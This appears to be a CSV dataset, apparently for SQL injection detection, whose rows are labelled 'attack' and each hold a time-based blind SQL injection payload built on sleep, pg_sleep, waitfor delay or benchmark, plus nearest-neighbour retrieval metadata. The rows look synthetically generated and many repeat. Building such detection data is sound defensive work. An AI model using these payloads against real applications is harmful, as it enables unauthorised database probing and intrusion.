id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000372,attack,time,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,nearest_attack_euclidean,R000548,5.7347805164269285
CTGAN_000373,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,6.142602632367998
CTGAN_000374,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,5.33281124759278
CTGAN_000375,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000785,6.731512749720718
CTGAN_000376,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,4.817656451745909
CTGAN_000377,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,5.789139427381446
CTGAN_000378,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000182,5.20229260384662
CTGAN_000379,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000857,5.169462011508528
CTGAN_000380,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,5.382063152190348
CTGAN_000381,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,6.12483059518202
CTGAN_000382,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R000775,3.6785060610508564
CTGAN_000383,attack,time,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000559,5.002536277057694
CTGAN_000384,attack,time,1  )   where 7165  =  7165 and sleep  (  5  )  #,nearest_attack_euclidean,R000721,3.829547973927781
CTGAN_000385,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000668,6.149204745723859
CTGAN_000386,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000843,6.537358146448153
CTGAN_000387,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000625,6.4790691399783436
CTGAN_000388,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000858,6.911977489560082
CTGAN_000389,attack,time,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000375,5.3609575151793285
CTGAN_000390,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R001081,3.643185603689295
CTGAN_000391,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.701553025773172
CTGAN_000392,attack,time,1  )   where 7956  =  7956 or sleep  (  5  )  #,nearest_attack_euclidean,R000437,5.677699157844896
CTGAN_000393,attack,time,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",nearest_attack_euclidean,R000277,7.046247846762887
CTGAN_000394,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,4.927178732952377
CTGAN_000395,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.453959737374116
CTGAN_000396,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.50275087960296
CTGAN_000397,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,4.321146784949954
CTGAN_000398,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,5.9066780849258285
CTGAN_000399,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000843,7.98014500177102
CTGAN_000400,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,7.595534860935872
CTGAN_000401,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",nearest_attack_euclidean,R001025,6.047917646581292
CTGAN_000402,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg",nearest_attack_euclidean,R001100,6.616610083923897
CTGAN_000403,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,5.3960884638980415
CTGAN_000404,attack,time,"1"" and sleep  (  5  )   and ""masm""  =  ""masm",nearest_attack_euclidean,R000716,6.688378582428864
CTGAN_000405,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,6.33195448488572
CTGAN_000406,attack,time,waitfor delay '0:0:5' and '%'  =  ',nearest_attack_euclidean,R000959,6.4128414013584765
CTGAN_000407,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000520,5.908959616020997
CTGAN_000408,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,7.434677393180507
CTGAN_000409,attack,time,"1""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000984,6.302748772934822
CTGAN_000410,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R001105,5.7741253957221055
CTGAN_000411,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R001001,6.167626279908561
CTGAN_000412,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,6.524591312154821
CTGAN_000413,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R001077,6.201903679311241
CTGAN_000414,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,6.965164815410065
CTGAN_000415,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,6.0489927443187375
CTGAN_000416,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000925,4.546529916098502
CTGAN_000417,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,6.254339251515914
CTGAN_000418,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,6.648618197878486
CTGAN_000419,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.5982333430265525
CTGAN_000420,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,7.482275114386989
CTGAN_000421,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000871,6.188001859062103
CTGAN_000422,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,4.810743976850057
CTGAN_000423,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,7.0415350377211565
CTGAN_000424,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,5.717504625690037
CTGAN_000425,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,7.880960627775488
CTGAN_000426,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000414,7.240825811322564
CTGAN_000427,attack,time,"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",nearest_attack_euclidean,R000902,6.371098022384052
CTGAN_000428,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.837261460713411
CTGAN_000429,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,5.853651299956448
CTGAN_000430,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,4.034172689653381
CTGAN_000431,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,8.482046899732472
CTGAN_000432,attack,time,"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000866,6.157284197895765
CTGAN_000433,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,4.789042373733099
CTGAN_000434,attack,time,select pg_sleep  (  5  )   and   (  1044  =  1044,nearest_attack_euclidean,R000476,6.830189968902468
CTGAN_000435,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,7.004456751273515
CTGAN_000436,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,6.201208532763542
CTGAN_000437,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,nearest_attack_euclidean,R000435,6.067125450067323
CTGAN_000438,attack,time,1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000672,6.324852398650631
CTGAN_000439,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,6.058931369299011
CTGAN_000440,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.255918104725988
CTGAN_000441,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000857,7.035868800999603
CTGAN_000442,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,5.658728580172762
CTGAN_000443,attack,time,"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000638,5.092886838825967
CTGAN_000444,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.577928275057965
CTGAN_000445,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,8.497691021357253
CTGAN_000446,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000843,6.781831141782257
CTGAN_000447,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R001041,5.63171555380922
CTGAN_000448,attack,time,"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",nearest_attack_euclidean,R000866,7.167452835232747
CTGAN_000449,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000563,7.089895922272209
CTGAN_000450,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,7.846678029255552
CTGAN_000451,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R001077,5.798769979771715
CTGAN_000452,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,9.200298637134921
CTGAN_000453,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,5.170786781117548
CTGAN_000454,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,6.32312938881921
CTGAN_000455,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000803,6.068260836635543
CTGAN_000456,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000160,5.744100081534486
CTGAN_000457,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R001022,7.686678563294698
CTGAN_000458,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.225105370421653
CTGAN_000459,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,4.960012735844255
CTGAN_000460,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,6.64164911015739
CTGAN_000461,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.325563872756124
CTGAN_000462,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000907,6.426169147154351
CTGAN_000463,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,7.277939449714715
CTGAN_000464,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000304,6.598603551497992
CTGAN_000465,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,7.168793663678747
CTGAN_000466,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,4.679389302459356
CTGAN_000467,attack,time,1' and sleep  (  5  )   and 'kapr'  =  'kapr,nearest_attack_euclidean,R000991,4.476730573175822
CTGAN_000468,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,5.066988971665886
CTGAN_000469,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,6.344114582252893
CTGAN_000470,attack,time,select pg_sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000965,6.657272070708945
CTGAN_000471,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,3.9478995512092
CTGAN_000472,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000804,6.212104365027544
CTGAN_000473,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000770,5.320120983946805
CTGAN_000474,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R001029,5.19507080396932
CTGAN_000475,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R001079,5.062807726928502
CTGAN_000476,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,3.3744729039360335
CTGAN_000477,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,5.744552465608411
CTGAN_000478,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,7.381034600804053
CTGAN_000479,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000928,6.942992770977704
CTGAN_000480,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R001105,6.628360653798316
CTGAN_000481,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.904466004577324
CTGAN_000482,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,4.877048949210511
CTGAN_000483,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,6.6755980599033915
CTGAN_000484,attack,time,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",nearest_attack_euclidean,R001080,6.844248695380344
CTGAN_000485,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,7.1548918182195305
CTGAN_000486,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000412,6.753934543337956
CTGAN_000487,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R001105,8.328132459337803
CTGAN_000488,attack,time,"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000931,5.787222045866314
CTGAN_000489,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,6.469292965123329
CTGAN_000490,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R001048,5.5401346743992015
CTGAN_000491,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000962,5.9140508841794075
CTGAN_000492,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,nearest_attack_euclidean,R000435,5.413173050154614
CTGAN_000493,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000610,4.882824579693011
CTGAN_000494,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.092593631781125
CTGAN_000495,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R001018,6.89163779073616
CTGAN_000496,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,nearest_attack_euclidean,R000755,6.842508287759754
CTGAN_000497,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,4.853679457346408
CTGAN_000498,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.496648660980176
CTGAN_000499,attack,time,"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001070,6.703766599911191
CTGAN_000500,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,5.308110136839557
